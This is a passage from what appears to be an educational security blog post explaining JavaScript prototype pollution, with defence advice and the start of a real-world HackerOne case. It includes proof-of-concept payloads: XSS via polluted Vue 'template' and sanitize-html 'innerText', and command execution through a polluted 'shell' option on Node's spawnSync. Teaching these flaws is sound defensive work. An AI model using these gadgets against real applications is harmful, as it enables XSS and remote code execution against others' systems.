+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token string">'__proto__[a]=3'</span><span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>qs<span class="token punctuation">)</span> <span class="token comment">// &#123;&#125;</span>
+
+<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>When my query string is like this, <code>parseQs</code> will go and change the value of <code>obj.__proto__.a</code>, causing prototype pollution, which causes me to declare an empty object and print out <code>obj.a</code> later, but it prints out 3 because the object prototype has been contaminated.</p>
+<p>Many libraries that parse query strings have had similar issues, and below are a few examples:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651">jquery-deparam</a></li>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-BACKBONEQUERYPARAMETERS-1290381">backbone-query-parameters</a></li>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-JQUERYQUERYOBJECT-1255650">jquery-query-object</a></li>
+</ol>
+<p>In addition to parsing query strings, another feature that often causes this problem is merging objects. A simple merge object function looks like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> prop <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>prop<span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span> 
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token number">2</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">d</span><span class="token operator">:</span> <span class="token number">3</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">merge</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> customConfig<span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>
+<span class="token comment">// &#123; a: 1, b: &#123; c: 2, d: 3 &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>If the <code>customConfig</code> above is controllable, then there will be a problem:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token number">2</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__": &#123;"a": 1&#125;&#125;'</span><span class="token punctuation">)</span>
+<span class="token function">merge</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> customConfig<span class="token punctuation">)</span>
+
+<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The reason why <code>JSON.parse</code> is used here is that if you write it directly like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">__proto__</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>it won’t work, <code>customConfig</code> will only be an empty object. You need to use <code>JSON.parse</code> to create an object with a key of <code>__proto__</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">__proto__</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__": &#123;"a": 1&#125;&#125;'</span><span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span> <span class="token comment">// &#123;&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span> <span class="token comment">// &#123; __proto__: &#123; a: 1 &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Similarly, many merge-related libraries have had this vulnerability, such as:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-MERGE-1040469">merge</a></li>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173733">lodash.merge</a></li>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643">plain-object-merge </a></li>
+</ol>
+<p>In addition to these, basically any library that operates on objects has had similar problems, such as:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-IMMER-1019369">immer</a></li>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536">mootools</a></li>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-IOREDIS-1567196">ioredis</a></li>
+</ol>
+<p>Now that we know where prototype pollution problems are likely to occur, it is not enough to just contaminate properties on the prototype. We also need to find places that can be affected, that is, which places will change behavior after the properties are contaminated, so that we can execute the attack.</p>
+<h2><span id="prototype-pollution-script-gadgets">Prototype pollution script gadgets</span></h2><p>These “code that can be exploited as long as we pollute the prototype” are called script gadgets. There is a GitHub repo that collects these gadgets: <a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution">Client-Side Prototype Pollution</a>. Some gadgets may be unimaginable, let me demonstrate (<a target="_blank" rel="noopener" href="https://aszx87410.github.io/demo/prototype-pollution/vue.html">demo webpage</a>):</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/vue/dist/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    &#123;&#123; message &#125;&#125;
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token comment">// 污染 template</span>
+    <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>template <span class="token operator">=</span> <span class="token string">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class="token punctuation">;</span>
+    <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> 
+      <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Hello Vue!'</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>A seemingly harmless Vue hello world, after we pollute <code>Object.prototype.template</code>, becomes an XSS that allows us to insert any code.</p>
+<p>Or like this (<a target="_blank" rel="noopener" href="https://aszx87410.github.io/demo/prototype-pollution/vue.html">demo webpage</a>):</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class="token punctuation">;</span>
+    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">sanitizeHtml</span><span class="token punctuation">(</span><span class="token string">'&lt;div>hello&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Although it is a library for sanitizing, after polluting <code>Object.prototype.innerText</code>, it becomes a good helper for XSS.</p>
+<p>Why do these problems occur? Taking <code>sanitize-html</code> as an example, it is because of this piece of code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>frame<span class="token punctuation">.</span>innerText <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>hasText <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>textFilter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    result <span class="token operator">+=</span> frame<span class="token punctuation">.</span>innerText<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Because innerText is directly assumed to be a safe string by default, it is directly concatenated. After we pollute this property, when this property does not exist, the value of the prototype will be used, and finally it becomes an XSS.</p>
+<p>In addition to client-side, server-side Node.js also has similar risks, such as:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123'</span><span class="token punctuation">]</span>
+<span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span>
+  <span class="token string">'echo'</span><span class="token punctuation">,</span> params
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This is a very simple code that executes the <code>echo</code> command and passes in parameters. This parameter will be automatically processed for you, so you don’t have to worry about command injection issues:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123 &amp;&amp; ls'</span><span class="token punctuation">]</span>
+<span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span>
+  <span class="token string">'echo'</span><span class="token punctuation">,</span> params
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 123 &amp;&amp; ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>But if there is a prototype pollution vulnerability, it can be transformed into RCE (Remote code execution) with a slight change, allowing attackers to execute any command (assuming the attacker can control params):</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123 &amp;&amp; ls'</span><span class="token punctuation">]</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token comment">// 只多了這行，參數的解析就會不一樣</span>
+<span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span>
+  <span class="token string">'echo'</span><span class="token punctuation">,</span> params<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">/*
+123
+index.js
+node_modules
+package-lock.json
+package.json
+*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The reason for this is that there is an option called <code>shell</code> in the third parameter options of <code>child_process.spawn</code>. Setting it to true will cause different behavior, and the official <a target="_blank" rel="noopener" href="https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options">documentation</a> also states:</p>
+<blockquote>
+<p>If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.</p>
+</blockquote>
+<p>By combining prototype pollution with script gadgets (<code>child_process.spawn</code>), a highly critical vulnerability has been successfully created.</p>
+<h2><span id="summary">Summary</span></h2><p>If there is a function in the program that allows attackers to pollute properties on the prototype, this vulnerability is called prototype pollution. Prototype pollution itself is not very useful and needs to be combined with other code to be effective. The code that can be combined with it is called script gadget.</p>
+<p>For example, Vue’s internal implementation will render the corresponding content based on the <code>template</code> property of an object, so as long as we pollute <code>Object.prototype.template</code>, we can create an XSS vulnerability. Or <code>child_process.spawn</code> uses <code>shell</code>, so after polluting it, it becomes an RCE vulnerability.</p>
+<p>What needs to be fixed is not the usable script gadgets, unless you change every place where the object is accessed, but this is not a fundamental solution. The real solution is to eliminate prototype pollution so that the prototype cannot be polluted, and there will be no such problems.</p>
+<h2><span id="how-to-defend">How to defend</span></h2><p>On any prototype pollution vulnerability page on <a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-SWIPER-1088062">snyk</a>, there are defense suggestions, which can also be found in this article: <a target="_blank" rel="noopener" href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Prototype pollution attack in NodeJS application</a>.</p>
+<p>There are several common defense methods. The first is to prevent the <code>__proto__</code> key when performing operations on these objects. For example, the query string parsing and merge object mentioned earlier can use this method.</p>
+<p>However, in addition to <code>__proto__</code>, another bypass method should also be noted, like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+obj<span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'prototype'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Using <code>constructor.prototype</code> can also pollute the properties on the prototype chain, so these methods should be blocked together to be safe.</p>
+<p>For example, the prototype pollution of <a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad">lodash.merge</a> is fixed using this method. Special processing is done when the key is <code>__proto__</code> or <code>prototype</code>.</p>
+<p>The second method is simple and easy to understand, which is to not use objects, or more precisely, “do not use objects with prototypes”.</p>
+<p>Some people may have seen a way to create objects like this: <code>Object.create(null)</code>. This creates an empty object without the <code>__proto__</code> property, which is a truly empty object with no methods. Because of this, there will be no prototype pollution problems:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
+obj<span class="token punctuation">[</span><span class="token string">'__proto__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">// 根本沒有 __proto__ 這個屬性</span>
+<span class="token comment">// TypeError: Cannot set property 'a' of undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Like the query string parsing library mentioned at the beginning, this method has been used to defend against prototype pollution. For example, <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/query-string">query-string</a>, which is downloaded up to 10 million times a week, has the following statement in its <a target="_blank" rel="noopener" href="https://github.com/sindresorhus/query-string#parsestring-options">documentation</a>:</p>
+<blockquote>
+<p>.parse(string, options?)<br>Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.</p>
+<p>The returned object is created with Object.create(null) and thus does not have a prototype.</p>
+</blockquote>
+<p>Other suggestions include using <code>Map</code> instead of <code>&#123;&#125;</code>, but I think most people are still used to using objects, and I personally think <code>Object.create(null)</code> is a bit better than Map.</p>
+<p>Or use <code>Object.freeze(Object.prototype)</code> to freeze the prototype so that it cannot be modified:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+obj<span class="token punctuation">[</span><span class="token string">'__proto__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>However, one problem with <code>Object.freeze(Object.prototype)</code> is that if a third-party package modifies <code>Object.prototype</code>, such as adding a property directly to it for convenience, it will be difficult to debug because modifying it after freezing will not cause an error, it just won’t be modified successfully.</p>
+<p>So you may find that your program is broken because of a third-party package, but you don’t know why. Another possible risk I can think of is polyfill. If in the future, a polyfill is needed to be added to <code>Object.prototype</code> due to version issues, it will be invalidated due to the freeze.</p>
+<p>As for Node.js, you can also use the <code>--disable-proto</code> option to turn off <code>Object.prototype.__proto__</code>. For details, please refer to the <a target="_blank" rel="noopener" href="https://nodejs.org/api/cli.html#cli_disable_proto_mode">official documentation</a>.</p>
+<p>In the future, document policy may also be used for processing. You can follow this issue: <a target="_blank" rel="noopener" href="https://github.com/WICG/document-policy/issues/33">Feature proposal: Mitigation for Client-Side Prototype Pollution</a>.</p>
+<h2><span id="real-world-examples">Real-world examples</span></h2><p>Finally, let’s take a look at two real-world examples of prototype pollution to give you a better sense of it.</p>
+<p>The first example is a vulnerability in the well-known bug bounty platform, HackerOne (yes, it’s a vulnerability in the platform itself). The full report can be found here: <a target="_blank" rel="noopener" href="https://hackerone.com/reports/986386">#986386 Reflected XSS on www.hackerone.com via Wistia embed code</a></p>
+<p>On their website, they used a third-party library that contained the following code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">i<span class="token punctuation">.</span>_initializers<span class="token punctuation">.</span><span class="token function-variable function">initWLog</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> e<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">,</span> o<span class="token punctuation">,</span> a<span class="token punctuation">,</span> l<span class="token punctuation">,</span> s<span class="token punctuation">,</span> d<span class="token punctuation">,</span> u<span class="token punctuation">,</span> p<span class="token punctuation">,</span> c<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">=</span> i<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    document<span class="token punctuation">.</span>referrer <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>u <span class="token operator">=</span> i<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>referrer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It parses <code>location.href</code> and <code>document.referrer</code>, both of which are controllable by attackers, and the <code>i.url.parse</code> function has a prototype pollution vulnerability, allowing for arbitrary property pollution.</p>
+<p>After pollution, the author discovered another piece of code that is similar to the <code>createElement</code> we wrote earlier. <code>fromObject</code> traverses properties and puts them on the DOM:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>chrome <span class="token operator">=</span> r<span class="token punctuation">.</span>elem<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">id</span><span class="token operator">:</span> r<span class="token punctuation">.</span><span class="token function">seqId</span><span class="token punctuation">(</span><span class="token string">'wistia_chrome_'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token keyword">class</span><span class="token operator">:</span> <span class="token string">'w-chrome'</span><span class="token punctuation">,</span>
